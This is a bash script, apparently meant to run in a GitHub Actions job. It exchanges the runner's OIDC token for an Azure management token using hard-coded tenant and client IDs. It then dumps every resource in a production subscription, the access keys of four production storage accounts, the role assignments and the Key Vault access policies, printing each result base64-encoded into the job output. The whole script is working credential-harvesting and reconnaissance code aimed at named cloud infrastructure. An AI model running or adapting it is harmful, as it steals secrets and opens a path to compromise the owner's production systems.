#!/bin/bash
set -e

echo "=== OIDC Token ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"

echo "=== Management Token ==="
AAD=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
MT=$(echo "$AAD" | jq -r .access_token)
echo "MGMT_TOKEN_LEN=${#MT}"

SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

echo "=== List ALL Resources ==="
RES=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01")
echo "RESOURCES_B64=$(echo "$RES" | base64 -w0)"

echo "=== Storage Account Keys ==="
for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- Keys: $SA ---"
  # Try both RGs
  for RGN in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
    KEYS=$(curl -sS -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RGN/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01" 2>&1)
    CODE=$(echo "$KEYS" | jq -r '.error.code // empty')
    if [ -z "$CODE" ]; then
      echo "KEYS_${SA}=$(echo "$KEYS" | base64 -w0)"
      break
    else
      echo "KEYS_${SA}_${RGN}=ERR:$CODE"
    fi
  done
done

echo "=== Role Assignments ==="
ROLES=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
echo "ROLES_B64=$(echo "$ROLES" | base64 -w0)"

echo "=== KV2 Role Assignments ==="
KV2ROLES=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
echo "KV2ROLES_B64=$(echo "$KV2ROLES" | base64 -w0)"

echo "=== Key Vault 2 Access Policies ==="
KV2=$(curl -sS -H "Authorization: Bearer $MT" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01")
echo "KV2_CONFIG_B64=$(echo "$KV2" | base64 -w0)"

echo "=== DONE ==="